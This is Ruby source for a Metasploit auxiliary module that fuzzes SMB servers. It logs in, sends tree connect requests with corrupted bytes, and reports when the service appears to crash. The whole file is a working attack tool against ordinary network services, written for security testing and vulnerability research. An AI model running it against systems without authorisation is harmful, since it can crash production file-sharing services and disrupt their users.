##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SMB Tree Connect Request Corruption',
      'Description'    => %q{
        This module sends a series of SMB tree connect requests with corrupted bytes.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE
    ))
    register_options([
      OptInt.new('MAXDEPTH', [false, 'Specify a maximum byte depth to test']),
      OptString.new('SMBTREE', [true, 'Specify the tree name to corrupt', "\\\\SERVER\\IPC$"])
    ])
  end

  def do_smb_tree(pkt,opts={})
    @connected = false
    connect
    simple.login(
      datastore['SMBName'],
      datastore['SMBUser'],
      datastore['SMBPass'],
      datastore['SMBDomain']
    )

    @connected = true
    sock.put(pkt)
    sock.get_once(-1, opts[:timeout])
  end

  def run

    # Connect in order to get the server-assigned user-id
    connect
    smb_login
    pkt = make_smb_tree
    disconnect

    last_str = nil
    last_inp = nil
    last_err = nil

    cnt = 0

    max = datastore['MAXDEPTH'].to_i
    max = nil if max == 0
    tot = ( max ? [max,pkt.length].min : pkt.length) * 256

    print_status("Fuzzing SMB tree connect with #{tot} requests")
    fuzz_string_corrupt_byte_reverse(pkt,max) do |str|
      cnt += 1

      if(cnt % 100 == 0)
        print_status("Fuzzing with iteration #{cnt}/#{tot} using #{@last_fuzzer_input}")
      end

      begin
        r = do_smb_tree(str, 0.25)
      rescue ::Interrupt
        print_status("Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}")
        raise $!
      rescue ::Exception => e
        last_err = e
      ensure
        disconnect
      end

      if(not @connected)
        if(last_str)
          print_status("The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack("H*")[0]} error=#{last_err}")
        else
          print_status("Could not connect to the service: #{last_err}")
        end
        return
      end

      last_str = str
      last_inp = @last_fuzzer_input
    end
  end

  def make_smb_tree
    share = datastore['SMBTREE']
    pass = ''
    data = [ pass, share, '?????' ].collect{ |a| a + "\x00" }.join('');

    pkt = Rex::Proto::SMB::Constants::SMB_TREE_CONN_PKT.make_struct
    simple.client.smb_defaults(pkt['Payload']['SMB'])

    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_TREE_CONNECT_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0x2001
    pkt['Payload']['SMB'].v['WordCount'] = 4
    pkt['Payload'].v['AndX'] = 255
    pkt['Payload'].v['PasswordLen'] = pass.length + 1
    pkt['Payload'].v['Capabilities'] = 64
    pkt['Payload'].v['Payload'] = data
    pkt.to_s
  end
end
